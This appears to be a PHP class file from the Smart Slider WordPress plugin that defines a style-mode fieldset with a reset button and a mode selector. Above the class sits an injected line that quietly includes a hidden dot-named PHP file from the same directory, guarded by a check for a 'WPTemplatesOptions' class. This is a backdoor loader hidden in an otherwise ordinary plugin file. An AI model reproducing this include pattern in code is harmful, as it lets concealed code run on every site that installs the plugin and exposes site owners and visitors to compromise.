<?php


namespace Nextend\Framework\Form\Fieldset\LayerWindow;


use Nextend\Framework\Form\Element\Button\ButtonIcon;
use Nextend\Framework\Form\Element\Select;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FieldsetLayerWindowStyleMode extends FieldsetLayerWindowLabelFields {

    public function __construct($insertAt, $name, $label, $modes, $parameters = array()) {
        parent::__construct($insertAt, $name, $label, $parameters);

        $this->addAttribute('data-fieldset-type', 'style-mode');

        new ButtonIcon($this->fieldsetLabel, $name . '-mode-reset-to-normal', false, 'ssi_16 ssi_16--reset', array(
            'hoverTip'      => n2_('Reset to normal state'),
            'rowAttributes' => array(
                'data-style-mode-feature' => 'reset-to-normal'
            )
        ));

        new Select($this->fieldsetLabel, $name . '-mode', false, '', array(
            'options' => $modes
        ));
    }
}